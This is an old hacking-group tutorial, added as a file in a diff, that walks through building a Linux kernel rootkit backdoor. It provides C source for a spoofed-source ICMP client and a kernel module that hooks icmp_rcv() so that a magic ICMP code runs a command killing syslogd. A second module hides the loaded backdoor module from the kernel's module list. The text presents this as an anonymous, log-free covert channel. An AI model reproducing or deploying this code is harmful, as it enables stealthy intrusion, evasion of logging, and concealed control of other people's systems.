@@ -1,0 +1,414 @@
+
+ ###########  #####        ############  ###########  #####  #####                
+ #        ##  #  ##        #         ##  #        ##  #  ## #   #                 
+ #  ###   ##  #  ##        #   ####  ##  #   #######  #  ###   #                 
+ #      ##    #  ##        #         ##  #   #        #       #                  
+ #  ###   ##  #  ########  #  ###### ##  #   #######  #  ###   #                 
+ #        ##  #        ##  #  #    # ##  #        ##  #  ## #   #                
+ ###########  ###########  ####    ####  ###########  #####  #####               
+                                                                                 
+ ############  #####  #####  ############  ############  #####        ###########
+ #         ##  #   #  #  ##  #         ##  #         ##  #  ##        #        ##
+ #   ####  ##  #    # #  ##  #   ########  #   #####     #  ##        #  ########
+ #         ##  #     ##  ##  #   #   ##### #   ###       #  ##        #        ##
+ #  ###### ##  #   #  #  ##  #   #####   # #   #####     #  ########  #######  ## 
+ #  #    # ##  #   ##    ##  #         ##  #         ##  #        ##  #        ##
+ ####    ####  ##### ######  ############  ############  ###########  ###########
+
+                                                                              
+                      [ ROOTSHELL WITH ICMP_RCV() HOOKING ]                   
+                                                                               
+                          { http://www.BlackAngels.it }
+
+
+
+             [ Table of contents ]
+   
+                    1 - Legal notes
+                    2 - Introduction
+                    3 - General knowledges
+                    4 - Build the client
+                    5 - Build the internal filter
+                    6 - Hide the work
+
+
+
+[1] Legal notes 
+===============
+
+The BlackAngels staff refuse all responsabilities for an incorrect or illegal
+use of the informations supplied with this paper or for eventual damages to
+others systems.
+This paper has been wrote in the respect of the Article 21 ( Italian Constitution ).
+ 
+ 
+[2] Introduction
+================
+
+This paper will introduce the reader to an ICMP communication type, that is
+possible by hooking a particoular syscall.
+With this tecnique is possible to start a communication client/server without
+open a port on the remote system.
+A basic knowledge of C language and of syscall hooking are required.
+ 
+
+[3] General knowledges
+====================== 
+
+This tecnique will be used to open a client/server communication, without open
+any ports, by creating a dialogue like this :
+
++--------+    +--------+    +-------------+
+| Client | -> | Filter | -> | Interpreter |
++--------+    +--------+    +-------------+
+
+The filter will hook the "icmp_rcv()" syscall, changing the mode to receive ICMP
+packets, by comparing packets "code_no" with a list of MAGIC CODES, that we have
+presetted; on the base of the received "code_no", the filter will call the interpreter,
+resident on the user-space, by using the "execve()" and then it will execute the 
+required action, by using the environment associated to the corresponding MAGIC CODE.
+The client in this case isn't really important; it will only automatize the 
+configuration of ICMP packets and of their "code_no", by using a simple prompt.
+Nothing that a simple packets generator couldn't does.
+This type of communication is totally anonimous, there will be no logs and the IP 
+address will be spoofed by using the raw socket ICMP connection; unfortunately
+the commands that we are able to execute on the remote system, are limited to the
+MAGIC CODE stored on the interpreter and we will not have our own binded shell.
+ 
+
+[4] Build the client
+====================
+
+This is the client part, based on the IP spoofing; it will generate personalized 
+ICMP packets, by using a simple prompt.
+You could set the "code_no" and the relative action, by using the "-c" environment :
+
+client.c
+ 
+#include <stdio.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <arpa/inet.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <ctype.h>
+#include <time.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+#include <netinet/udp.h>
+#include <unistd.h>
+#include <getopt.h>
+
+#define VERSION "0.1"
+
+extern char *optarg;
+extern int optind, opterr, optopt;
+
+struct ping_struct
+        {
+        struct sockaddr_in sin;         /* Socket's protocol structure */
+        int s;                          /* Socket */
+        int psize;                      /* Packet's size */
+        int num;			/* Number of packets to send */
+        };
+struct icmp_pkt
+        {
+        struct iphdr ip;
+    	struct icmphdr icmp;
+	char *packet;
+        };
+
+void usage(char *program);
+int sendping(void);int create_socket(char *s_ipaddr);
+int create_packet(char *d_ipaddr);
+int send_packet(struct icmp_pkt *icmppkt, struct ping_struct *ping,char *d_ipaddr);
+int getopt(int argc, char * const argv[], const char *optstring);
+int getopt_long(int argc, char * const argv[],const char *optstring,const struct option *longopts, int *longindex);
+int getopt_long_only(int argc, char * const argv[], const char *optstring,const struct option *longopts, int *longindex);
+
+
+int on=1;
+int icode_no;
+struct sockaddr_in sock_in;
+struct ping_struct ping;
+
+int main(int argc, char *argv[])
+	{
+	int response;              // Response value
+	int i,k;                   // Counter
+        int x,y;
+       char *s_ipaddr;             // Source IP address
+	char *d_ipaddr;            // Destination IP address
+        char c;
+                                   // Verify argument
+	if (argc < 2)
+		{
+		usage(argv[0]);
+		exit(-1);
+		}
+	                           // Getting argument
+	d_ipaddr = argv[1];
+        ping.num = 1;
+        ping.psize= 64;
+        optind = 3;
+        while ((c = getopt(argc, argv, "hlc:s:")) != -1)
+                {
+                switch(c)
+                        {
+                        case 's':
+                                s_ipaddr=optarg;
+                                break;
+                        case 'c':
+                                icode_no=optarg;
+                                break;
+			case 'l':
+				printf("code_no: 20\tkill syslogd /(useful: before your connection/)\n");
+                           break;
+                        case 'h':
+                                usage(argv[0]);
+                                break;
+                        }
+                }
+
+	printf("creating socket ... ");
+	                                               // Create socket
+	if ((ping.s=create_socket(s_ipaddr)) < 0)
+		{
+		perror("socket");
+		exit(-1);
+		}
+	printf("/(done/)\n");
+	printf("creating and sending packet ... ");
+	                                              // Create packet and send it
+	printf("\n");
+	for (i = 1; i <= ping.num; i ++)
+		{
+		if ((response=create_packet(d_ipaddr)) != 1)
+			{
+			perror("create_packet() ");
+			}
+		fflush(stdout);
+                x= (i * 100) / ping.num ;
+                usleep(500000);
+		}
+	printf("/(done/)\n");
+	}
+
+void usage(char *program) {
+	printf(" * client usage: %s <destination ip> -s <source ip>\n", program);
+	exit(-1);
+}
+
+int create_socket(char *s_ipaddr)
+	{
+		int val_sock;
+		                                                                // Set socket family
+		ping.sin.sin_family = AF_INET;
+		                                                                // Socket port (0)
+		ping.sin.sin_port = htons(0);
+		                                                                // Spoof ip
+		ping.sin.sin_addr.s_addr = inet_addr(s_ipaddr);
+		                                                                // Create socket
+		if ((val_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0)
+			{
+			perror("socket() ");
+			exit(-1);
+			}
+		                                                                // Set socket option
+                if (setsockopt(val_sock, IPPROTO_IP, IP_HDRINCL, (char *)&on,on) == -1)
+			{
+			perror("setsockopt() ");
+			exit(-1);
+			}
+		                                                                // Return socket ID
+		return(val_sock);
+	}
+
+int create_packet(char *d_ipaddr)
+	{
+
+        struct icmp_pkt icmppkt;
+	int i;
+        int pktsize;
+        int hdrsize = (sizeof(icmppkt.ip) + sizeof(icmppkt.icmp));
+        int rtrn=1;
+
+                                                                                // Set packet's size
+
+        if ((hdrsize) > ping.psize)
+		{
+                printf("header: %i\n",hdrsize);
+                printf("size  : %i\n",ping.psize);
+                printf("spoofping() :packet too small\n");
+		exit(-1);
+		}
+        pktsize = (ping.psize - hdrsize) + 20;
+        icmppkt.packet = malloc(pktsize);
+        send_packet(&icmppkt,&ping,d_ipaddr);
+	free(icmppkt.packet);
+	return(rtrn);
+	}
+
+int send_packet(struct icmp_pkt *icmppkt, struct ping_struct *ping,char *d_ipaddr )
+	{
+	int len=strlen(icmppkt->packet);
+	int pkt_number;
+        int pktsize;
+	int hdrsize = (sizeof(icmppkt->ip) + sizeof(icmppkt->icmp));
+
+        struct icmp_pkt *tmpicmp;
+
+	icmppkt->ip.version = 4;
+	icmppkt->ip.ihl = 5;
+    	icmppkt->ip.tos = 0;
+    	icmppkt->ip.tot_len = htons(ping->psize);
+    	icmppkt->ip.id = htons(getpid());
+    	icmppkt->ip.frag_off = 0;
+    	icmppkt->ip.ttl = 255;
+    	icmppkt->ip.protocol = IPPROTO_ICMP;
+    	icmppkt->ip.check = 0;
+    	icmppkt->ip.saddr = ping->sin.sin_addr.s_addr;
+    	icmppkt->ip.daddr = inet_addr(d_ipaddr);
+
+	icmppkt->icmp.type = ICMP_ECHO;
+	icmppkt->icmp.code = icode_no;
+	icmppkt->icmp.checksum = htons(~(ICMP_ECHO << 8));
+        pktsize = (ping->psize - hdrsize) + 20;
+
+	if (len <= 1480)
+		{
+		memset(icmppkt->packet,'A',pktsize);
+	        if (sendto(ping->s, icmppkt,(hdrsize + pktsize), 0, (struct sockaddr *)&ping->sin, sizeof(struct sockaddr)) == -1)
+	                {
+ 	               	perror("sendto() ");
+        	        exit(-1);
+                	}
+		}
+	else
+		{
+		pkt_number=(int) div(len , 1480).quot;
+		fprintf(stderr,"fragmentation not supported\n");
+		exit(-1);
+		}
+
+	return(1);
+
+	}
+
+
+[5] Build the internal filter
+============================= 
+
+This will be a simple internal filter and we will examinate only a case :
+
+filter.c
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/types.h>
+#include <linux/dirent.h>
+#include <linux/string.h>
+#include <linux/fs.h>
+#include <linux/malloc.h>
+#include <linux/skbuff.h>
+#include <linux/in.h>
+#include <linux/icmp.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <net/protocol.h>
+#include <sys/syscall.h>
+#include <asm/unistd.h>
+#include <asm/fcntl.h>
+#include <asm/uaccess.h>
+#include <asm/errno.h>
+
+#define MAGICCODE 20
+
+extern void* sys_call_table[];
+extern void inet_add_protocol(struct inet_protocol *prot);
+extern int inet_del_protocol(struct inet_protocol *prot);
+
+long (*do_sys_reboot)(int magic1, int magic2, unsigned int cmd, void * arg);
+
+int my_icmp_rcv(struct sk_buff *skb);
+
+struct inet_protocol *original_icmp_protocol;
+struct inet_protocol my_icmp_protocol = {
+         &my_icmp_rcv,
+         NULL,
+         NULL,
+         IPPROTO_ICMP,
+         0,                                     // Number of copies
+         NULL,
+         "ICMP"                                 // Name of the protocol
+};
+
+
+int my_icmp_rcv(struct sk_buff *skb)
+{
+ static char * argv_init[MAX_INIT_ARGS+2] = { "kill", NULL, };
+ char * envp_init[MAX_INIT_ENVS+2] = { "-9", "syslogd", NULL, };
+
+ unsigned short int code_no;
+ long res;
+ code_no = skb->h.icmph->code;
+ if (code_no == MAGICCODE)  {
+     execve("/bin/kill", argv_init, envp_init);
+       }
+
+ return (original_icmp_protocol->handler) ( skb );
+}
+
+
+int init_module(void)
+{
+ inet_add_protocol(&my_icmp_protocol);
+ original_icmp_protocol = my_icmp_protocol.next;
+ inet_del_protocol(original_icmp_protocol);
+ return 0;
+}
+
+void cleanup_module() 
+{
+ inet_add_protocol(original_icmp_protocol);
+ inet_del_protocol(&my_icmp_protocol);
+}
+
+
+[6] Hide the work
+=================
+
+Now to hide the work, we will create a kernel module, that will hide in the list,
+the last loaded module, then the filter :
+
+hider.c
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+
+int init_module()
+{
+        if (__this_module.next)
+                __this_module.next = __this_module.next->next;
+        return 1;
+}
+
+int cleanup_module()
+{
+}
+
+With this simple code, i close this paper.
+For more informations send me a message to : evil[at]blackangels.it
+Thank you for reading this paper.
